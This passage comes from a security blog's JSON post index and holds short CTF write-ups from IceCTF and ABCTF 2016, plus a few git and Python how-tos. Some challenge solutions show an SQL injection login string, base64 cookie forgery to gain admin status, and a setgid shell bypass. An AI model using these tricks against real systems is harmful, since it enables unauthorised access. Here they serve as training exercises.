length 8192 chunk IDAT at offset 0x5826f, length 8192 chunk IDAT at offset 0x5a27b, length 8192 chunk IDAT at offset 0x5c287, length 8192 chunk IDAT at offset 0x5e293, length 8192 chunk IDAT at offset 0x6029f, length 8192 chunk IDAT at offset 0x622ab, length 8192 chunk IDAT at offset 0x642b7, length 8192 chunk IDAT at offset 0x662c3, length 8192 chunk IDAT at offset 0x682cf, length 8192 chunk IDAT at offset 0x6a2db, length 8192 chunk IDAT at offset 0x6c2e7, length 8192 chunk IDAT at offset 0x6e2f3, length 8192 chunk IDAT at offset 0x702ff, length 8192 chunk IDAT at offset 0x7230b, length 1619 chunk IEND at offset 0x7296a, length 0 additional data after IEND chunkERRORS DETECTED in corrupt.png.fixdisplay corrupt.png.fix Flag is IceCTF{t1s_but_4_5cr4tch}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 50 - Vape Nation - Stego","slug":"IceCTF-50-Vape-Nation-Stego","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.488Z","comments":true,"path":"en/IceCTF-50-Vape-Nation-Stego/","link":"","permalink":"http://rawsec.ml/en/IceCTF-50-Vape-Nation-Stego/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionGo Green! vape_nation.png Solution Open vape_nation.png with StegSolve. Description said Go Green so just do it! Green plane 0 contain the flag: IceCTF{420_CuR35_c4NCEr}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"stegano","slug":"stegano","permalink":"http://rawsec.ml/tags/stegano/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 50 - Scavenger Hunt - Misc","slug":"IceCTF-50-Scavenger-Hunt-Misc","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.485Z","comments":true,"path":"en/IceCTF-50-Scavenger-Hunt-Misc/","link":"","permalink":"http://rawsec.ml/en/IceCTF-50-Scavenger-Hunt-Misc/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionThere is a flag hidden somewhere on our website, do you think you can find it? Good luck! Solution Go to the sponsors page. CTRL + U: look at source code. &lt;img class=&quot;activator&quot; src=&quot;/static/images/logos/syndis.png&quot; alt=&quot;IceCTF{Y0u_c4n7_533_ME_iM_h1Din9}&quot;&gt;: that’s it.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/tags/misc/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 50 - Flag Storage - Web","slug":"IceCTF-50-Flag-Storage-Web","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.478Z","comments":true,"path":"en/IceCTF-50-Flag-Storage-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-50-Flag-Storage-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionWhat a cheat, I was promised a flag and I can’t even log in. Can you get in for me? flagstorage.vuln.icec.tf. They seem to hash their passwords, but I think the problem is somehow related to this. Solution Look at the source code: 123456789101112&lt;script&gt;$(function()&#123; var updatePassword = function(e)&#123; // hash client side for better security, never leak the pw over the wire var sha = new jsSHA(\"SHA-256\", \"TEXT\"); sha.update($(this).val()); $(\"#password\").val(sha.getHash(\"HEX\")); &#125;; $(\"#password_plain\").on(\"change\", updatePassword); $(\"#form\").on(\"submit\", updatePassword);&#125;);&lt;/script&gt; Script will send our password hashed on the network instead of plain text. Login with random credentials. Open your browser network analyser and see the POST params: username and password_plain that you filled + password containing e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855. e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 is the SHA256 hash of the null string according to this or if you try with https://crackstation.net/. Description of the challenge tell us it’s an SQLi so may be we need to inject username and let password_plain null so our hashed password will correspond to the hash we found. Try a classic username: &#39; OR 1=1 # and null password instead of random password. We get the flag: IceCTF{why_would_you_even_do_anything_client_side}.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 55 - Demo - Pwn","slug":"IceCTF-55-Demo-Pwn","date":"2016-08-24T22:00:00.000Z","updated":"2016-10-12T21:07:54.508Z","comments":true,"path":"en/IceCTF-55-Demo-Pwn/","link":"","permalink":"http://rawsec.ml/en/IceCTF-55-Demo-Pwn/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionI found this awesome premium shell, but my demo version just ran out… can you help me crack it? /home/demo/ on the shell. Solution Connect to the shell provided by IceCTF. Go to /home/demo/. Our goal is to display flag.txt but it is impossible ofr the moment: 12345[ctf-578@icectf-shell-2016 /home/demo]$ cat flag.txtcat: flag.txt: Permission denied[ctf-578@icectf-shell-2016 /home/demo]$ sh$ cat /home/demo/flag.txtcat: /home/demo/flag.txt: Permission denied Display demo.c 1234567891011121314151617181920212223#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;libgen.h&gt;#include &lt;string.h&gt;void give_shell() &#123; gid_t gid = getegid(); setresgid(gid, gid, gid); system(&quot;/bin/sh&quot;);&#125;int main(int argc, char *argv[]) &#123; if(strncmp(basename(getenv(&quot;_&quot;)), &quot;icesh&quot;, 6) == 0)&#123; give_shell(); &#125; else &#123; printf(&quot;I&apos;m sorry, your free trial has ended.\\n&quot;); &#125; return 0;&#125; To call give_shell() we have to bypass the if statement. We need the _ environment variable to be _=icesh. But our zsh shell don’t allow us to change: _ is read-only and we can’t make it writable. 1234[ctf-578@icectf-shell-2016 /home/demo]$ export \\_=iceshzsh: read-only variable: _[ctf-578@icectf-shell-2016 /home/demo]$ typeset +rx \\_=iceshtypeset: _: can&apos;t change type of a special parameter _ contain the name of the last command but launching icesh and then ./demo doesn’t work in this environment because the last command is ./demo so _=./demo. As give_shell() will give us a /bin/sh, let’s try with it. Start a /bin/sh. With /bin/sh, _ contain the last command before last one, so running icesh and then ./demo will work: _=icesh. So that launch give_shell() and give a /bin/sh enhanced with special gid instead of having I’m sorry, your free trial has ended. printed. With this empowered shell we can display the flag.txt file:12$ cat /home/demo/flag.txtIceCTF&#123;wH0_WoU1d_3vr_7Ru5t_4rgV&#125;","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://rawsec.ml/tags/pwn/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"IceCTF - 10 - Spotlight - Web","slug":"IceCTF-10-Spotlight-Web","date":"2016-08-15T22:00:00.000Z","updated":"2016-10-12T21:07:54.538Z","comments":true,"path":"en/IceCTF-10-Spotlight-Web/","link":"","permalink":"http://rawsec.ml/en/IceCTF-10-Spotlight-Web/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : IceCTF 2016 Website : https://icec.tf/ Type : Online Format : Jeopardy CTF Time : link DescriptionSomeone turned out the lights and now we can’t find anything. Send halp! spotlight Solution That’s a little JS script that spotlight where the mouse is focused. CTRL + U ans show sources to find the JS script. The JS script is located at [this link][link js]. And we find this line:1console.log(\"DEBUG: IceCTF&#123;5tup1d_d3v5_w1th_th31r_l095&#125;\");","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"Adding an existing local project to a new remote git repository","slug":"adding-existing-local-new-remote-repository-git","date":"2016-07-27T22:00:00.000Z","updated":"2016-10-12T21:07:54.508Z","comments":true,"path":"en/adding-existing-local-new-remote-repository-git/","link":"","permalink":"http://rawsec.ml/en/adding-existing-local-new-remote-repository-git/","excerpt":"","text":"You want to put your project on a remote Git repository like GitHub, Bitbucket, Gitlab or Gogs to share and collaborate? Follow the following steps: Create a new repository on one of the git service quoted before and let it empty. In your terminal, go into your local project. Initialize the local repository as a Git repository: git init Add the wanted files in the your local repository with git add file or add the entire repository with git add .. Files will be staged for the first commit. Commit the staged files: git commit -m &quot;first commit&quot;. In your terminal, add the URL of the remote repository: git remote add origin https://example.com/examle.git. And push the changes to the remote Git repository: git push -u origin master.","categories":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"git","slug":"git","permalink":"http://rawsec.ml/tags/git/"}],"keywords":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}]},{"title":"Deploying a subfolder to GitHub Pages","slug":"deploying-subfolder-github-pages","date":"2016-07-26T22:00:00.000Z","updated":"2016-10-12T21:07:54.502Z","comments":true,"path":"en/deploying-subfolder-github-pages/","link":"","permalink":"http://rawsec.ml/en/deploying-subfolder-github-pages/","excerpt":"","text":"You are building a website with a static site generator like Hexo or Jekyll? You want to have website source code on GitHub and the website running on gh-pages without maintaining two Git repository? You need subtree! You are making slideshows with Reveal.js? You want to have slideshow source code on GitHub and the slideshow running on gh-pages without maintaining two Git repository? You need subtree! Sometimes it’s useful to have a subfolder on gh-pages and all the source code on the master branch and all of that in the same root directory. In fact for all project that you want to see his source code hosted on GitHub and the building result living on gh-pages. For this example, I suppose you have a build folder under the project’s root directory. Remove the build folder from the project’s .gitignore file. Make git aware of the build folder: 12git add buildgit commit -m &quot;Preparing build/ for subtree&quot; Each time you re-build the project to a final release, use subtree push to send the build on the gh-pages branch on GitHub: 1git subtree push --prefix build origin gh-pages","categories":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"git","slug":"git","permalink":"http://rawsec.ml/tags/git/"}],"keywords":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}]},{"title":"Creating a simple python package with Distutils and upload it to PyPI","slug":"creating-python-package-distutils-pypi","date":"2016-07-26T22:00:00.000Z","updated":"2016-10-12T21:07:54.488Z","comments":true,"path":"en/creating-python-package-distutils-pypi/","link":"","permalink":"http://rawsec.ml/en/creating-python-package-distutils-pypi/","excerpt":"","text":"I made a quick summurizing slideshow on how to create a simple python package with Distutils and upload it to PyPI. Ressources: Slidehow Slideshow sources Package example","categories":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"http://rawsec.ml/categories/programming/python/"}],"tags":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/tags/programming/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"python","slug":"python","permalink":"http://rawsec.ml/tags/python/"}],"keywords":[{"name":"programming","slug":"programming","permalink":"http://rawsec.ml/categories/programming/"},{"name":"python","slug":"programming/python","permalink":"http://rawsec.ml/categories/programming/python/"}]},{"title":"ABCTF - 50 - Archive Me - Reconaissance","slug":"ABCTF-50-Archive-Me-Reconaissance","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.502Z","comments":true,"path":"en/ABCTF-50-Archive-Me-Reconaissance/","link":"","permalink":"http://rawsec.ml/en/ABCTF-50-Archive-Me-Reconaissance/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionIf you could look at our website from a while ago im sure the flag would be there… Solution Ok so we are looking for a cached version of http://abctf.xyz/ There is two main services: Google Web Cache Archive.org and his WayBack Machine You can immediatly forget Google cache because it only keep the last cache and the title of the challenge is Archive Me so there is more chances that we have to use Archive.org You can try Google Web Cache anyway but there is nothing interesting. Now lets try Archive.org: The website was saved 2 times on May 10, 2016 at 19:17:53 and at 19:23:07. By default the one shown is the one at 19:17:53 which is not the good one but on the other you can see ABCTF{Archives_are_useful!} one the hoem page","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"guessing","slug":"guessing","permalink":"http://rawsec.ml/tags/guessing/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 50 - Chocolate - Web Exploitation","slug":"ABCTF-50-Chocolate-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.538Z","comments":true,"path":"en/ABCTF-50-Chocolate-Web-Exploitation/","link":"","permalink":"http://rawsec.ml/en/ABCTF-50-Chocolate-Web-Exploitation/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionIf you could become admin you would get a flag. Link Solution Launch Element Inspector of Firefox or the Firebug addon and use the network analyser. See the request cookie e2FkbWluOmZhbHNlfQ== Un-base64 it: 12echo -n &quot;e2FkbWluOmZhbHNlfQ==&quot; | base64 -d &amp;&amp; echo &quot;&quot;&#123;admin:false&#125; Edit the cookie and change the value to {admin:true} in base64 12echo -n &quot;&#123;admin:true&#125;&quot; | base64e2FkbWluOnRydWV9 Send it again with a proxy tool like Burp, ZAP, Temper Data And TADA! We get into the admin page: Wow! You&#39;re an admin, maybe. Well anyway, here is your flag, ABCTF{don&#39;t_trust_th3_coooki3}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://rawsec.ml/tags/web/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 50 - Drive Home - Reconaissance","slug":"ABCTF-50-Drive-Home-Reconaissance","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.485Z","comments":true,"path":"en/ABCTF-50-Drive-Home-Reconaissance/","link":"","permalink":"http://rawsec.ml/en/ABCTF-50-Drive-Home-Reconaissance/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionWe found this link scribbled on a piece of paper: document/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit?usp=sharing. It is broken but we need you to fix it! Solution It’s a google drive link, so modify the given link to get: https://docs.google.com/document/d/1_TxYCrk5vIMlUjiB1OioXmR7b-Uq_a9aPIh9JyYlPNs/edit?usp=sharing Flag is abctf{g00gle_driv3_1s_my_f4v0r1t3}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"guessing","slug":"guessing","permalink":"http://rawsec.ml/tags/guessing/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 50 - Java Madness - Reverse Engineering","slug":"ABCTF-50-Java-Madness-Reverse-Engineering","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.528Z","comments":true,"path":"en/ABCTF-50-Java-Madness-Reverse-Engineering/","link":"","permalink":"http://rawsec.ml/en/ABCTF-50-Java-Madness-Reverse-Engineering/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionHey if you can get this to pass some tests you could probably have the flag. Solution Here is the java source code: 12345678910111213141516171819202122232425262728public class what_the_hack &#123; public static void main(String[] args) &#123; String check = \"\"; if(args.length != 5)&#123; System.out.println(\"Almost! (;\"); &#125; else &#123; for(int i = args.length - 1; i &gt;= 0; i--)&#123; System.out.println(i); for(int j = args[i].length() - 1; j &gt;= 0; j--)&#123; check += args[i].charAt(j); System.out.println(args[i].charAt(j)); &#125; &#125; if(check.equals(\"abctf is the coolest ctf\"))&#123; System.out.println(\"Flag: \" + \"ABCTF&#123;\" + args[0] + args[1] + args[2] +args[3] + args[4] + \"&#125;\"); &#125; else&#123; System.out.println(check); &#125; &#125; &#125;&#125; Compile the code: javac what_the_hack.java Run it: 12java what_the_hackAlmost! (; Analyse the code, there must be 5 strings args: 123456789101112java what_the_hack a b c d e4e3d2c1b0aedcba By analysing the code we understand that the software display the position of the arg and is content in the reverse order and that the valid check must be abctf is the coolest ctf So write abctf is the coolest ctf to reverse it: 123456789101112131415161718192021222324252627java what_the_hack abctf is the coolest ctf4ftc3tselooc2eht1si0ftcbaftctseloocehtsiftcba ftctseloocehtsiftcba is the reverse but we need to space it: 12345678910111213141516171819202122232425262728293031java what_the_hack &apos;ftc&apos; &apos; tselooc&apos; &apos; eht&apos; &apos; si&apos; &apos; ftcba&apos;4abctf3is2the1coolest0ctfFlag: ABCTF&#123;ftc tselooc eht si ftcba&#125; We got it!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"reverse","slug":"reverse","permalink":"http://rawsec.ml/tags/reverse/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 60 - MoonWalk - Forensics","slug":"ABCTF-60-MoonWalk-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/ABCTF-60-MoonWalk-Forensics/","link":"","permalink":"http://rawsec.ml/en/ABCTF-60-MoonWalk-Forensics/","excerpt":"","text":"InformationsVersion By Translated by Version Comment Chill3d noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionThere is something a little off about this picture. If you could help us we could give you some points! Just find us a flag! TL;DR Solution First, we’ll check file type: 12file PurpleThing.pngPurpleThing.png: PNG image data, 3200 x 2953, 8-bit/color RGBA, non-interlaced Because it’s a Forensics challenge, we can look for other files hidden in this image: 12345678910binwalk PurpleThing.pngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 3200 x 2953, 8-bit/color RGBA, non-interlaced85 0x55 Zlib compressed data, best compression2757 0xAC5 Zlib compressed data, best compression765455 0xBAE0F JPEG image data, JFIF standard 1.01765485 0xBAE2D TIFF image data, big-endian, offset of first image directory: 81809691 0x1B9D1B StuffIt Deluxe Segment (data): f Hilights on the JPEG file found: intersting! So we’ll launch a filecarving tool to inspect the file and look for magic headers to recover hidden files: 1234567891011121314151617181920212223242526foremost -v PurpleThing.pngForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick MikusAudit FileForemost started at Thu Jul 21 22:20:19 2016Invocation: foremost -v PurpleThing.pngOutput directory: /root/CTF/ABCTF/60-MoonWalk-Forensics/outputConfiguration file: /etc/foremost.confProcessing: PurpleThing.png|------------------------------------------------------------------File: PurpleThing.pngStart: Thu Jul 21 22:20:19 2016Length: 2 MB (2354256 bytes)Num Name (bs=512) Size File Offset Comment0: 00001495.jpg 1 MB 765455 *|Finish: Thu Jul 21 22:20:20 20161 FILES EXTRACTEDjpg:= 1------------------------------------------------------------------Foremost finished at Thu Jul 21 22:20:20 2016 Now let’s see the image: display output/jpg/00001495.jpg We find the flag: ABCTF{PNG_S0_C00l}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"http://rawsec.ml/tags/forensics/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 60 - Virtual Box 4 - Virtual Series","slug":"ABCTF-60-Virtual-Box-4-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.492Z","comments":true,"path":"en/ABCTF-60-Virtual-Box-4-Virtual-Series/","link":"","permalink":"http://rawsec.ml/en/ABCTF-60-Virtual-Box-4-Virtual-Series/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionWhat’s this? Solution Start &gt; Documents &gt; whats this (it’s a recent file) Open it &gt; Content is: where am i? Start &gt; Documents &gt; whats this Right click &gt; Properties File is in: C:\\Program Files\\Outlook Express\\ABCTF{Y0U_F0UND_ME}\\what this.txt I let find you the flag :D","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 10 - Virtual Box 1 - Virtual Series","slug":"ABCTF-10-Virtual-Box-1-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.512Z","comments":true,"path":"en/ABCTF-10-Virtual-Box-1-Virtual-Series/","link":"","permalink":"http://rawsec.ml/en/ABCTF-10-Virtual-Box-1-Virtual-Series/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionDo you know how to use a VM? Download the Virtual Machine here. Solution Start the Windows 98 VM C:\\WINDOWS\\Desktop\\flag 1.doc is on Desktop, content: 12You did it.ABCTF&#123;FREE_P0INTS&#125; Easy!","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 75 - Virtual Box 5 - Virtual Series","slug":"ABCTF-75-Virtual-Box-5-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.508Z","comments":true,"path":"en/ABCTF-75-Virtual-Box-5-Virtual-Series/","link":"","permalink":"http://rawsec.ml/en/ABCTF-75-Virtual-Box-5-Virtual-Series/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link DescriptionI accidentaly closed out this odd message I found. Can you get it back? Solution Open Internet Explorer (IE) Open the historic There is a picture, it’s text in Wingdings 3 font Translate it to a normal police: ABCTF{ITS_C00L_L00KING_BACK}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"ABCTF - 70 - L33t H4xx0r - Web Exploitation","slug":"ABCTF-70-L33t-H4xx0r-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/ABCTF-70-L33t-H4xx0r-Web-Exploitation/","link":"","permalink":"http://rawsec.ml/en/ABCTF-70-L33t-H4xx0r-Web-Exploitation/","excerpt":"","text":"InformationsVersion By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : 